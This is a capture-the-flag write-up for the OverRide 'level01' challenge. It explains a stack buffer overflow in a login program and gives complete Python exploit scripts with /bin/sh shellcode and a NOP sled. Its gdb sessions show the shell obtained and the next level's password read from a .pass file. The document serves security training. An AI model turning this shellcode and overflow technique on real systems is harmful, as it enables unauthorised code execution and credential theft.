# level01

after login to level01 user, there's an `level01` executable in the home directory.

after dissassembling the executable using `ghidra` and `binary ninja`, you can check the source code at [source.c](source.c).

the program is prompting for a credential, and it checks if the input matches a hardcoded username `dat_wil` and password `admin`.

but the trick is even if the password is correct, the program will still print that the password is invalid, check line 67:

```c
if (isDiff && !isDiff)
{
  puts("nope, incorrect password...\n");
  return 1;
}
```

but there's a vulnerability here, the program is defining a buffer of size 64 and it uses `fgets` to read up to 100 bytes from stdin, which can lead to a buffer overflow.

so to exploit this vulnerability, we will inject a `shellcode` then overwrite the return address to point to the `shellcode`.

i've created a python script to do this, you can check it at [exploit.py](./Resources/exploit.py).

first we need to know the exact offset to overwrite the return address, we can use `gdb` to find it out.

first we will add a breakpoint at leave of the `main` function.

```sh
0x080485af <+223>:   lea    -0x8(%ebp),%esp

(gdb) break *0x080485af
```

then we will create a pattern, we will use [`this website`](https://wiremask.eu/tools/buffer-overflow-pattern-generator/) to generate a cyclic pattern of 200 bytes.

we will use a python script to help us run the program with the cyclic pattern as input.

```python
#!/usr/bin/env python


print("dat_wil")

offset = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac$

print(offset)
```

after running the program with gdb, it will hit the breakpoint, then we can check the value of `eip` register.

```sh
(gdb) r < <(./exploit.py)
Starting program: /home/users/level01/level01 < <(./exploit.py)
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password:
nope, incorrect password...


Breakpoint 1, 0x080485af in main ()
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()
(gdb)
```

it sigfaulted at `0x37634136`, using the same website, we can find that it overwrote the return address at offset `80`.

so now we know that we need to fill `80` bytes to reach the return address, then we can overwrite it with the address of our shellcode.

because of memory unstablility, the address of our shellcode may vary, so we will use a `NOP sled` to increase the chance of hitting the shellcode.

here's the final exploit code:

```python
#!/usr/bin/env python

print("dat_wil")

NOP_sled = "\x90" * 43
shellcode = "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
padding= "A"*16
return_address = "\x41\x41\x41\x41" * 5

print(NOP_sled + shellcode + padding + return_address)
```

we add `43` bytes of `NOP sled`, then the `shellcode`, then `16` bytes of padding to fill the space before the return address, total is `80` bytes, then we overwrite the return address with `0x41414141` (just for testing purpose).

```sh
(gdb) r < <(./exploit.py)
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/users/level01/level01 < <(./exploit.py)
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password:
nope, incorrect password...


Breakpoint 1, 0x080485af in main ()
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb)
```
it hit the breakpoint again, and this time the `eip` register is `0x41414141`, which means we successfully overwrote the return address.

first of all we need to unset all the environment variables to make the memory layout more predictable.

now we can change the return address to point to our `NOP sled`, we will pick an address in the middle of the `NOP sled`.

```sh
(gdb) x/100x $esp
```

let's pick `0xffffde00` as the return address.

```py
#!/usr/bin/env python

print("dat_wil")

NOP_sled = "\x90" * 43
shellcode = "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
padding= "A"*16
return_address = "\x00\xde\xff\xff" * 5

print(NOP_sled + shellcode + padding + return_address)
```

after running the exploit, it work's but gdb can't catch the shell, so we will run it outside gdb.

```sh
(gdb) r < <(./exploit.py)
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/users/level01/level01 < <(./exploit.py)
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password:
nope, incorrect password...


Breakpoint 1, 0x080485af in main ()
(gdb) c
Continuing.
process 1964 is executing new program: /bin/dash                            warning: Selected architecture i386:x86-64 is not compatible with reported target architecture i386
Architecture of file not recognized.
(gdb)
```

let's run it outside gdb:

```sh
level01@OverRide:~$ (./exploit.py ; cat) | env - PWD=/home/users/level01 /home/users/level01/level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password:
nope, incorrect password...

whoami
level02
cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8
```

we need to also unset all environment variables when running the exploit and keep the `PWD` variable because gdb also keeps it. and also we need run the program with it's full path because also gdb does that. we did all that because our payload works in gdb, so we need to replicate the same environment outside gdb.

we used `cat` to keep the shell open after the program exits.
